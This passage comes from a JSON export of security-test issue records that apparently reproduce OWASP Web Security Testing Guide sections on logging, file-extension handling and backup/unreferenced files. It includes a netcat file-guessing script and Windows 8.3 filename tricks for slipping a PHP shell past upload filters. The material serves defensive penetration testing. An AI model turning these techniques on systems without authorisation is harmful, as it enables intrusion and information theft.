keys for use with shared -configuration.\n* Maintain restricted access to the share containing the shared configuration and encryption keys. If this share is compromised, an attacker will be able to read and write any IIS configuration for your Web servers, redirect traffic from your site to malicious sources, and in some cases gain control of all web servers by loading arbitrary code into IIS worker processes.\n* Consider protecting this share with firewall rules and IPsec policies to allow only the member web servers to connect.\n\n#### Logging\n\nLogging is an important asset of the security of an application architecture, since it can be used to detect flaws in applications (users constantly trying to retrieve a file that does not really exist) as well as sustained attacks from rogue users. Logs are typically properly generated by web and other server software. It is not common to find applications that properly log their actions to a log and, when they do, the main intention of the application logs is to produce debugging output that could be used by the programmer to analyze a particular error.\nIn both cases (server and application logs) several issues should be tested and analyzed based on the log contents:\n\n1. Do the logs contain sensitive information?\n2. Are the logs stored in a dedicated server?\n3. Can log usage generate a Denial of Service condition?\n4. How are they rotated? Are logs kept for the sufficient time?\n5. How are logs reviewed? Can administrators use these reviews to detect targeted attacks?\n6. How are log backups preserved?\n7. Is the data being logged data validated (min/max length, chars etc) prior to being logged?\n\n##### Sensitive Information in Logs\n\nSome applications might, for example, use GET requests to forward form data which can be seen in the server logs. This means that server logs might contain sensitive information (such as usernames and passwords, or bank account details). This sensitive information can be misused by an attacker if they obtained the logs, for example, through administrative interfaces or known web server vulnerabilities or misconfiguration (like the well-known \u0060server-status\u0060 misconfiguration in Apache-based HTTP servers).\nEvent logs will often contain data that is useful to an attacker (information leakage) or can be used directly in exploits:\n\n* Debug information\n* Stack traces\n* Usernames\n* System component names\n* Internal IP addresses\n* Less sensitive personal data (e.g. email addresses, postal addresses and telephone numbers associated with named individuals)\n* Business data\n\nAlso, in some jurisdictions, storing some sensitive information in log files, such as personal data, might oblige the enterprise to apply the data protection laws that they would apply to their backend databases to log files too. And failure to do so, even unknowingly, might carry penalties under the data protection laws that apply.\nA wider list of sensitive information is:\n\n* Application source code\n* Session identification values\n* Access tokens\n* Sensitive personal data and some forms of personally identifiable information (PII)\n* Authentication passwords\n* Database connection strings\n* Encryption keys\n* Bank account or payment card holder data\n* Data of a higher security classification than the logging system is allowed to store\n* Commercially-sensitive information\n* Information it is illegal to collect in the relevant jurisdiction\n* Information a user has opted out of collection, or not consented to e.g. use of do not track, or where consent to collect has expired\n\n#### Log Location\n\nTypically servers will generate local logs of their actions and errors, consuming the disk of the system the server is running on. However, if the server is compromised, its logs can be wiped out by the intruder to clean up all the traces of its attack and methods. If this were to happen the system administrator would have no knowledge of how the attack occurred or where the attack source was located. Actually, most attacker tool kits include a \u201Clog zapper\u201D that is capable of cleaning up any logs that hold given information (like the IP address of the attacker) and are routinely used in attacker\u2019s system-level root kits.\nTherefore, it is wise to keep logs in a separate location and not on the web server itself. This also makes it easier to aggregate logs from different sources that refer to the same application (such as those of a web server farm) and it also makes it easier to do log analysis (which can be CPU intensive) without affecting the server itself.\n\n#### Log Storage\n\nImproper storage of logs can introduce a Denial of Service condition. Any attacker with sufficient resources might be able to produce a sufficient number of requests that would fill up the allocated space to log files, if they are not specifically prevented from doing so. However, if the server is not properly configured, the log files will be stored in the same disk partition as the one used for the operating system software or the application itself. This means that if the disk becomes filled, the operating system or the application might fail due to the inability to write on the disk.\nTypically in UNIX systems logs will be located in /var (although some server installations might reside in /opt or /usr/local) and it is important to make sure that the directories in which logs are stored are in a separate partition. In some cases, and in order to prevent the system logs from being affected, the log directory of the server software itself (such as /var/log/apache in the Apache web server) should be stored in a dedicated partition.\nThis is not to say that logs should be allowed to grow to fill up the file system they reside in. Growth of server logs should be monitored in order to detect this condition since it may be indicative of an attack.\nTesting this condition, which can be risky in production environments, can be done by firing off a sufficient and sustained number of requests to see if these requests are logged and if there\u2019s a possibility to fill up the log partition through these requests. In some environments where QUERY\\_STRING parameters are also logged regardless of whether they are produced through GET or POST requests, big queries can be simulated that will fill up the logs faster since, typically, a single request will cause only a small amount of data to be logged, such as date and time, source IP address, URI request, and server result.\n\n#### Log Rotation\n\nMost servers (but few custom applications) will rotate logs in order to prevent them from filling up the file system they reside on. The assumption during log rotation is that the information within them is only necessary for a limited duration.\nThis feature should be tested in order to ensure that:\n\n* Logs are kept for the time defined in the security policy, not more and not less.\n* Logs are compressed once rotated (this is a convenience, since it will mean that more logs will be stored for the same available disk space).\n* File system permissions for rotated log files should be the same as (or stricter than) those for the log files themselves. For example, web servers will need to write to the logs they use but they don\u2019t actually need to write to rotated logs, which means that the permissions of the files can be changed upon rotation to prevent the web server process from modifying these.\n\nSome servers might rotate logs when they reach a given size. If this happens, it must be ensured that an attacker cannot force logs to rotate in order to hide his tracks.\n\n#### Log Access Control\n\nEvent log information should never be visible to end users. Even web administrators should not have access to such logs as it breaches separation of duty controls. Ensure that any access control schema that is used to protect access to raw logs, and any application providing capabilities to view or search the logs are not linked with access control schemas for other application user roles. Neither should any log data be visible to unauthenticated users.\n\n#### Log Review\n\nReviewing logs can be used not only for extracting usage statistics of files in web servers (which is typically what most log-based applications focus on) but also for determining if attacks are occurring on the web server.\nIn order to analyze web server attacks, the error log files of the server need to be analyzed. Review should concentrate on:\n\n* 40x (not found) error messages. A large amount of these from the same source might be indicative of a CGI scanner tool being used against the web server\n* 50x (server error) messages. These can be an indication of an attacker abusing parts of the application which fail unexpectedly. For example, the first phases of a SQL injection attack will produce these error message when the SQL query is not properly constructed and its execution fails on the backend database.\n\nLog statistics or analysis should not be generated or stored in the same server that produces the logs. Otherwise, an attacker might, through a web server vulnerability or improper configuration, gain access to them and retrieve similar information as would be disclosed by log files themselves.","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* Apache\n    * Apache Security, by Ivan Ristic, O\u2019reilly, March 2005.\n    * [Apache Security Secrets: Revealed (Again), Mark Cox, November 2003](https://awe.com/mark/talks/apachecon2003us.html)\n    * [Apache Security Secrets: Revealed, ApacheCon 2002, Las Vegas, Mark J Cox, October 2002](https://awe.com/mark/talks/apachecon2002us.html)\n    * [Performance Tuning](https://httpd.apache.org/docs/current/misc/perf-tuning.html)\n* Lotus Domino\n    * Lotus Security Handbook, William Tworek et al., April 2004, available in the IBM Redbooks collection\n    * Lotus Domino Security, an X-force white-paper, Internet Security Systems, December 2002\n    * Hackproofing Lotus Domino Web Server, David Litchfield, October 2001\n* Microsoft IIS\n    * [Security Best Practices for IIS 8](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj635855(v=ws.11))\n    * [CIS Microsoft IIS Benchmarks](https://www.cisecurity.org/benchmark/microsoft_iis/)\n    * Securing Your Web Server (Patterns and Practices), Microsoft Corporation, January 2004\n    * IIS Security and Programming Countermeasures, by Jason Coombs\n    * From Blueprint to Fortress: A Guide to Securing IIS 5.0, by John Davis, Microsoft Corporation, June 2001\n    * Secure IIS 5 Checklist, by Michael Howard, Microsoft Corporation, June 2000\n* Red Hat\u2019s (formerly Netscape\u2019s) iPlanet\n    * Guide to the Secure Configuration and Administration of iPlanet Web Server, Enterprise Edition 4.1, by James M Hayes, The Network Applications Team of the Systems and Network Attack Center (SNAC), NSA, January 2001\n* WebSphere\n    * IBM WebSphere V5.0 Security, WebSphere Handbook Series, by Peter Kovari et al., IBM, December 2002.\n    * IBM WebSphere V4.0 Advanced Edition Security, by Peter Kovari et al., IBM, March 2002.\n* General\n    * [Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html), OWASP\n    * [SP 800-92](https://csrc.nist.gov/publications/detail/sp/800-92/final) Guide to Computer Security Log Management, NIST\n    * [PCI DSS v3.2.1](https://www.pcisecuritystandards.org/document_library) Requirement 10 and PA-DSS v3.2 Requirement 4, PCI Security Standards Council\n* Generic:\n    * [CERT Security Improvement Modules: Securing Public Web Servers](https://resources.sei.cmu.edu/asset_files/SecurityImprovementModule/2000_006_001_13637.pdf)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-03 Test File Extensions Handling for Sensitive Information","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nWeb servers commonly use file extensions to determine which technologies, languages, and plugins must be used to fulfill web requests. While this behavior is consistent with RFCs and Web Standards, using standard file extensions provides the penetration tester useful information about the underlying technologies used in a web appliance and greatly simplifies the task of determining the attack scenario to be used on particular technologies. In addition, mis-configuration of web servers could easily reveal confidential information about access credentials.\nFile extension checks are often done to validate files before uploading them to the server. Unrestricted file uploads can lead to unforeseen results because the content may not be what is expected, or due to unexpected OS filename handling.\nUnderstanding how web servers handle requests for files with different extensions can clarify server behavior based on the types of files accessed. For example, it can help to understand which file extensions are returned as text or plain versus those that cause server-side execution. The latter are indicative of technologies, languages, or plugins used by web servers or application servers. This information may provide additional insight into how the web application is engineered. For example, while a \u201C.pl\u201D extension is typically associated with server-side Perl support, the file extension alone can be misleading and not entirely indicative of the underlying technology. Take, for instance, server-side resources written in Perl, which might be renamed to disguise the usage of Perl. See the next section on \u201Cweb server components\u201D for more on identifying server-side technologies and components.","TestingInstructions":"## Test Objectives\n\n* Brute force sensitive file extensions that might contain raw data such as scripts, credentials, etc.\n* Validate that no system framework bypasses exist for the rules that have been set\n\n## How to Test\n\n### Forced Browsing\n\nSubmit requests with different file extensions and verify how they are handled. The verification should be on a per web directory basis. Verify directories that allow script execution. Web server directories can be identified by scanning tools which look for the presence of well-known directories. Additionally, mirroring the site structure helps testers reconstruct the directory tree served by the application.\nIf the web application architecture is load-balanced, it is important to assess all of the web servers. The ease of this task depends on the configuration of the balancing infrastructure. In an infrastructure with redundant components, there may be slight variations in the configuration of individual web or application servers. This may happen if the web architecture employs heterogeneous technologies (think of a set of IIS and Apache web servers in a load-balancing configuration, which may introduce slight asymmetric behavior between them, and possibly different vulnerabilities).\n\n#### Example\n\nThe tester has identified the existence of a file named \u0060connection.inc\u0060. Trying to access it directly gives back its contents, which are:\n\n\u0060\u0060\u0060\n\u003C?\n    mysql_connect(\u0022127.0.0.1\u0022, \u0022root\u0022, \u0022password\u0022)\n        or die(\u0022Could not connect\u0022);\n?\u003E\n\u0060\u0060\u0060\n\nThe tester determines the existence of a MySQL DBMS backend and the weak credentials used by the web application to access it.\nThe following file extensions should never be returned by a web server, as they pertain to files that could contain sensitive information or files that have no valid reason to be served.\n\n* \u0060.asa\u0060\n* \u0060.inc\u0060\n* \u0060.config\u0060\n\nThe following file extensions are related to files which, when accessed, are either displayed or downloaded by the browser. Therefore, files with these extensions must be checked to verify that they are indeed supposed to be served (and are not leftovers), and that they do not contain sensitive information.\n\n* \u0060.zip\u0060, \u0060.tar\u0060, \u0060.gz\u0060, \u0060.tgz\u0060, \u0060.rar\u0060, etc.: (Compressed) archive files\n* \u0060.java\u0060: No reason to provide access to Java source files\n* \u0060.txt\u0060: Text files\n* \u0060.pdf\u0060: PDF documents\n* \u0060.docx\u0060, \u0060.rtf\u0060, \u0060.xlsx\u0060, \u0060.pptx\u0060, etc.: Office documents\n* \u0060.bak\u0060, \u0060.old\u0060 and other extensions indicative of backup files (for example: \u0060~\u0060 for Emacs backup files)\n\nThe list given above details only a few examples, since file extensions are too many to be comprehensively treated here. Refer to [FILExt](https://filext.com/) for a more thorough database of extensions.\nTo identify files with a given extension, a mix of techniques can be employed. These techniques can include using vulnerability scanners, spidering and mirroring tools, and querying search engines (see [Testing: Spidering and googling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage)). Manual inspection of the application can also be beneficial, as it overcomes limitations in automatic spidering. See also [Testing for Old, Backup and Unreferenced Files](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information) which deals with the security issues related to \u201Cforgotten\u201D files.\n\n### File Upload\n\nWindows 8.3 legacy file handling can sometimes be used to defeat file upload filters.\nUsage examples:\n\n1. \u0060file.phtml\u0060 gets processed as PHP code.\n2. \u0060FILE~1.PHT\u0060 is served, but not processed by the PHP ISAPI handler.\n3. \u0060shell.phPWND\u0060 can be uploaded.\n4. \u0060SHELL~1.PHP\u0060 will be expanded and returned by the OS shell, then processed by the PHP ISAPI handler.\n\n### Gray-Box Testing\n\nWhite-box testing of file extension handling involves checking the server configurations in the web application architecture and verifying the rules for serving different file extensions.\nIf the web application relies on a load-balanced, heterogeneous infrastructure, determine whether this may introduce different behavior.\n\n## Tools\n\nVulnerability scanners, such as Nessus and Nikto, check for the existence of well-known web directories. They may allow the tester to download the site structure, which is helpful when trying to determine the configuration of web directories and how individual file extensions are served. Other tools that can be used for this purpose include:\n\n* [wget](https://www.gnu.org/software/wget)\n* [curl](https://curl.haxx.se/)\n* Perform a Google search for \u201Cweb mirroring tools\u201D","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-04 Review Old Backup and Unreferenced Files for Sensitive Information","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nWhile most of the files within a web server are directly handled by the server itself, it isn\u2019t uncommon to find unreferenced or forgotten files that can be used to obtain important information about the infrastructure or the credentials.\nMost common scenarios include the presence of renamed old versions of modified files, inclusion files that are loaded into the language of choice and downloaded as source, and even automatic or manual backups in the form of compressed archives. Backup files can also be generated automatically by the underlying file system the application is hosted on, a feature usually referred to as \u201Csnapshots\u201D.\nAll these files may grant the tester access to inner workings, back doors, administrative interfaces, or even credentials to connect to the administrative interface or the database server.\nAn important source of vulnerability is found in files unrelated to the application. These files may be created when editing application files, creating on-the-fly backup copies, or leaving old or unreferenced files in the web tree. Performing in-place editing or other administrative actions on production web servers may inadvertently leave backup copies, either generated automatically by the editor while editing files, or by the administrator who is zipping a set of files to create a backup.\nIt is easy to forget such files and this may pose a serious security threat to the application. It happens because backup copies may be generated with file extensions differing from those of the original files. A \u0060.tar\u0060, \u0060.zip\u0060 or \u0060.gz\u0060 archive that we generate (and might forget) has obviously a different extension, and the same happens with automatic copies created by many editors (for example, emacs generates a backup copy named \u0060file~\u0060 when editing \u0060file\u0060). Making a copy manually can produce a similar effect, such as when \u2018file\u2019 is copied as \u2018file.old\u2019. The underlying file system the application is on could be making \u0060snapshots\u0060 of your application at different points in time without your knowledge, which may also be accessible via the web, posing a similar but different \u0060backup file\u0060 style threat to your application.\nAs a result, these activities generate files that are not needed by the application and may be handled differently than the original file by the web server. For example, if we make a copy of login.asp and name it login.asp.old without proper security measures, it could potentially allow users to download the source code of login.asp. This is because \u0060login.asp.old\u0060 will be typically served as text or plain, rather than being executed because of its extension. In other words, accessing \u0060login.asp\u0060 causes the execution of the server-side code of \u0060login.asp\u0060, while accessing \u0060login.asp.old\u0060 causes the content of \u0060login.asp.old\u0060 (which is, again, server-side code) to be plainly returned to the user and displayed in the browser. This may pose security risks, since sensitive information may be revealed.\nGenerally, exposing server-side code is a bad idea. Not only are you unnecessarily exposing business logic, but you may be unknowingly revealing application-related information which may help an attacker (path names, data structures, etc.). Not to mention the fact that there are too many scripts with embedded username and password in clear text (which is a careless and extremely dangerous practice).\nOther causes of unreferenced files are due to design or configuration choices when they allow diverse kind of application-related files such as data files, configuration files, log files, to be stored in file system directories that can be accessed by the web server. These files have normally no reason to be in a file system space that could be accessed via web, since they should be accessed only at the application level, by the application itself (and not by the casual user browsing around).\n\n### Threats\n\nOld, backup and unreferenced files present various threats to the security of a web application:\n\n* Unreferenced files may disclose sensitive information that can facilitate a focused attack against the application; for example, include files containing database credentials, configuration files containing references to other hidden content, absolute file paths, etc.\n* Unreferenced pages may contain powerful functionality that can be used to attack the application; for example, an administration page that is not linked from published content but can be accessed by any user who knows where to find it.\n* Old and backup files may contain vulnerabilities that have been fixed in more recent versions; for example, \u0060viewdoc.old.jsp\u0060 may contain a directory traversal vulnerability that has been fixed in \u0060viewdoc.jsp\u0060 but can still be exploited by anyone who finds the old version.\n* Backup files may disclose the source code for pages designed to execute on the server; for example, requesting \u0060viewdoc.bak\u0060 may return the source code for \u0060viewdoc.jsp\u0060, which can be reviewed for vulnerabilities that may be difficult to find by making blind requests to the executable page. While this threat applies to scripting languages such as Perl, PHP, ASP, shell scripts, JSP, etc., it is not limited to them, as shown in the example provided in the next point.\n* Backup archives may contain copies of all files within (or even outside) the webroot. This allows an attacker to quickly enumerate the entire application, including unreferenced pages, source code, include files, etc. For example, if you forget a file named \u0060myservlets.jar.old\u0060 containing a backup copy of your servlet implementation classes, you are exposing a lot of sensitive information which can be decompiled and reverse engineered.\n* In some cases, copying or editing a file modifies the filename but leaves the file extension intact. This is common in Windows environments, where file copying operations generate filenames prefixed with \u201CCopy of \u201C or localized versions of this string. Since the file extension is left unchanged, this is not a case where an executable file is returned as plain text by the web server, and therefore not a case of source code disclosure. However, these files are dangerous too because there is a chance that they include obsolete and incorrect logic that, when invoked, could trigger application errors, which might yield valuable information to an attacker if diagnostic message display is enabled.\n* Log files may contain sensitive information about the activities of application users, for example, sensitive data passed in URL parameters, session IDs, URLs visited (which may disclose additional unreferenced content), etc. Other log files (e.g. ftp logs) may contain sensitive information about the maintenance of the application by system administrators.\n* File system snapshots may contain copies of the code that contain vulnerabilities that have been fixed in more recent versions. For example, \u0060/.snapshot/monthly.1/view.php\u0060 may contain a directory traversal vulnerability that has been fixed in \u0060/view.php\u0060 but can still be exploited by anyone who finds the old version.\n\n\n\u003Cbr\u003E\n","TestingInstructions":null,"Details":"## Test Objectives\n\n* Find and analyse unreferenced files that might contain sensitive information.\n\n## How to Test\n\n### Black-Box Testing\n\nTesting for unreferenced files uses both automated and manual techniques, and typically involves a combination of the following:\n\n#### Inference from the Naming Scheme Used for Published Content\n\nEnumerate all of the application\u2019s pages and functionality. This can be done manually using a browser, or using an application spidering tool. Most applications use a recognizable naming scheme, and organize resources into pages and directories using words that describe their function. It is often possible to infer the name and location of unreferenced pages from the naming scheme used for published content. For example, if a page titled viewuser.asp is found, one should also look for edituser.asp, adduser.asp, and deleteuser.asp. Similarly, if a directory /app/user is discovered, one should also search for /app/admin and /app/manager.\n\n#### Other Clues in Published Content\n\nMany web applications leave clues in published content that can lead to the discovery of hidden pages and functionality. These clues can often be found in the source code of HTML and JavaScript files. The source code for all published content should be manually reviewed to identify clues about other pages and functionality. For example:\nProgrammers\u2019 comments and commented-out sections of source code may refer to hidden content:\n\n\u0060\u0060\u0060\n\u003C!-- \u003CA HREF=\u0022uploadfile.jsp\u0022\u003EUpload a document to the server\u003C/A\u003E --\u003E\n\u003C!-- Link removed while bugs in uploadfile.jsp are fixed          --\u003E\n\u0060\u0060\u0060\n\nJavaScript may contain page links that are only rendered within the user\u2019s GUI under certain circumstances:\n\n\u0060\u0060\u0060\nvar adminUser=false;\nif (adminUser) menu.add (new menuItem (\u0022Maintain users\u0022, \u0022/admin/useradmin.jsp\u0022));\n\u0060\u0060\u0060\n\nHTML pages may contain FORMs that have been hidden by disabling the SUBMIT element:\n\n\u0060\u0060\u0060\n\u003Cform action=\u0022forgotPassword.jsp\u0022 method=\u0022post\u0022\u003E\n    \u003Cinput type=\u0022hidden\u0022 name=\u0022userID\u0022 value=\u0022123\u0022\u003E\n    \u003C!-- \u003Cinput type=\u0022submit\u0022 value=\u0022Forgot Password\u0022\u003E --\u003E\n\u003C/form\u003E\n\u0060\u0060\u0060\n\nAnother source of clues about unreferenced directories is the \u0060/robots.txt\u0060 file used to provide instructions to web robots:\n\n\u0060\u0060\u0060\nUser-agent: *\nDisallow: /Admin\nDisallow: /uploads\nDisallow: /backup\nDisallow: /~jbloggs\nDisallow: /include\n\u0060\u0060\u0060\n\n#### Blind Guessing\n\nIn its simplest form, this involves running a list of common filenames through a request engine in an attempt to guess files and directories that exist on the server. The following netcat wrapper script will read a wordlist from stdin and perform a basic guessing attack:\n\n\u0060\u0060\u0060\n#!/bin/bash\n\nserver=example.org\nport=80\n\nwhile read url\ndo\necho -ne \u0022$url\\t\u0022\necho -e \u0022GET /$url HTTP/1.0\\nHost: $server\\n\u0022 | netcat $server $port | head -1\ndone | tee outputfile\n\u0060\u0060\u0060\n\nDepending upon the server, GET may be replaced with HEAD for faster results. The output file specified can be grepped for \u201Cinteresting\u201D response codes. The response code 200 (OK) usually indicates that a valid resource has been found (provided the server does not deliver a custom \u201Cnot found\u201D page using the 200 code). But also look out for 301 (Moved), 302 (Found), 401 (Unauthorized), 403 (Forbidden) and 500 (Internal error), which may also indicate resources or directories that are worthy of further investigation.\nThe basic guessing attack should be run against the webroot, and also against all directories that have been identified through other enumeration techniques. More advanced/effective guessing attacks can be performed as follows:\n\n* Identify the file extensions in use within known areas of the application (e.g. JSP, ASPX, HTML), and use a basic wordlist appended with each of these extensions (or use a longer list of common extensions if resources permit).\n* For each file identified through other enumeration techniques, create a custom wordlist derived from that filename. Get a list of common file extensions (including \\~, bak, txt, src, dev, old, inc, orig, copy, tmp, swp, etc.) and use each extension before, after, and instead of, the extension of the actual filename.\n\nNote: Windows file copying operations generate filenames prefixed with \u201CCopy of \u201C or localized versions of this phrase, hence they do not change file extensions. While \u201CCopy of \u201C files typically do not disclose source code when accessed, they might yield valuable information in case they cause errors when invoked.\n\n#### Information Obtained Through Server Vulnerabilities and Misconfiguration\n\nThe most obvious way in which a misconfigured server may disclose unreferenced pages is through directory listing. Request all enumerated directories to identify any which provide a directory listing.\nNumerous vulnerabilities have been found in individual web servers which allow an attacker to enumerate unreferenced content, for example:\n\n* Apache ?M=D directory listing vulnerability.\n* Various IIS script source disclosure vulnerabilities.\n* IIS WebDAV directory listing vulnerabilities.\n\n#### Use of Publicly Available Information\n\nPages and functionality in internet-facing web applications that are not referenced from within the application itself may be referenced from other public domain sources. There are various sources of these references:\n\n* Pages that used to be referenced may still appear in the archives of internet search engines. For example, \u00601998results.asp\u0060 may no longer be linked from a company\u2019s site, but may remain on the server and in search engine databases. This old script may contain vulnerabilities that could be used to compromise the entire site. The \u0060site:\u0060 Google search operator may be used to run a query only against the domain of choice, such as in: \u0060site:www.example.com\u0060. Using search engines in this way has led to a broad array of techniques which you may find useful, and are described in the \u0060Google Hacking\u0060 section of this Guide. Check it to hone your testing skills via Google. Backup files are not likely to be referenced by any other files and therefore may have not been indexed by Google, but if they lie in browsable directories the search engine might know about them.\n* In addition, Google and Yahoo keep cached versions of pages found by their robots. Even if \u00601998results.asp\u0060 has been removed from the target server, a version of its output may still be stored by these search engines. The cached version may contain references to, or clues about, additional hidden content that still remains on the server.\n* Content that is not referenced from within a target application may be linked to by third-party sites. For example, an application which processes online payments on behalf of third-party traders may contain a variety of bespoke functionality which can (normally) only be found by following links within the sites of its customers.\n\n#### Filename Filter Bypass\n\nBecause deny list filters are based on regular expressions, one can sometimes take advantage of obscure OS filename expansion features which work in ways the developer didn\u2019t expect. The tester can sometimes exploit differences in ways that filenames are parsed by the application, web server, and underlying OS and it\u2019s filename conventions.\nExample: Windows 8.3 filename expansion \u0060c:\\\\program files\u0060 becomes \u0060C:\\\\PROGRA\\~1\u0060\n\n* Remove incompatible characters\n* Convert spaces to underscores\n* Take the first six characters of the basename\n* Add \u0060~\u003Cdigit\u003E\u0060 which is used to distinguish files with names using the same six initial characters\n* This convention changes after the first 3 name collisions\n* Truncate file extension to three characters\n* Make all the characters uppercase\n\n### Gray-Box Testing\n\nPerforming gray-box testing against old and backup files necessitates the examination of files within directories that belong to the set of web directories served by the web server(s) comprising the web application infrastructure. Theoretically the examination should be performed by hand to be thorough. However, since in most cases copies of files or backup files tend to be created by using the same naming conventions, the search can be easily scripted. For example, editors leave behind backup copies by naming them with a recognizable extension or ending and humans tend to leave behind files with a \u0060.old\u0060 or similar predictable extensions. A useful strategy would be to periodically schedule a background job to check for files with extensions that are likely to be identified as copies or backup files, while also performing manual checks on a longer time basis.\n\n\u003Cbr\u003E\n## Tools\n\nVulnerability assessment tools tend to include checks to spot web directories having standard names (such as \u201Cadmin\u201D, \u201Ctest\u201D, \u201Cbackup\u201D, etc.), and to report any web directory which allows indexing. If the tester is unable to find directory listing, they should try to check for probable backup extensions. Some tools that can help with this include:\n\n* [Nessus](https://www.tenable.com/products/nessus)\n* [Nikto2](https://cirt.net/Nikto2)\n\nWeb spider tools\n\n* [wget](https://www.gnu.org/software/wget/)\n* [Wget for Windows](http://www.interlog.com/~tcharron/wgetwin.html)\n* [Sam Spade](https://web.archive.org/web/20090926061558/http://preview.samspade.org/ssw/download.html)\n* [Spike proxy includes a site crawler function](https://www.spikeproxy.com/)\n* [Xenu](http://home.snafu.de/tilman/xenulink.html)\n* [curl](https://curl.haxx.se/)\n\nSome of them are also included in standard Linux distributions. Web development tools usually include facilities to identify broken links and unreferenced files.\n\n\u003Cbr\u003E\n","Implication":null,"Recommendation":"## Remediation\n\nFor an effective protection strategy, testing should be combined with a security policy that clearly forbids dangerous practices, including:\n\n* Editing files in-place on the web server or application server file systems. This is a particularly bad habit, since it is likely to generate backup or temporary files by the editors. It is amazing to see how often this is done, even in large organizations. If you absolutely need to edit files on a production system, do ensure that you don\u2019t leave behind anything that is not explicitly intended, and keep in mind that you are doing it at your own risk.\n* Carefully check any other activity performed on file systems exposed by the web server, such as spot administration activities. For example, if you occasionally need to take a snapshot of a couple of directories (which you should not do on a production system), you may be tempted to zip them first. Be careful not to leave behind such archive files.\n* Appropriate configuration management policies should help prevent obsolete and un-referenced files.\n* Applications should be designed not to create (or rely on) files stored under the web directory trees served by the web server. Data files, log files, configuration files, etc. should be stored in directories not accessible by the web server to counter the possibility of information disclosure, not to mention the potential for data modification if web directory permissions allow writing.\n* File system snapshots should not be accessible via the web if the document root is on a file system using this technology. Configure your web server to deny access to such directories, for example, under Apache, a location directive like this should be used:\n\n\u0060\u0060\u0060\n\u003CLocation ~ \u0022.snapshot\u0022\u003E\n    Order deny,allow\n    Deny from all\n\u003C/Location\u003E\n\u0060\u0060\u0060","References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1"}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-04 Review Old Backup and Unreferenced Files for Sensitive Information","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not 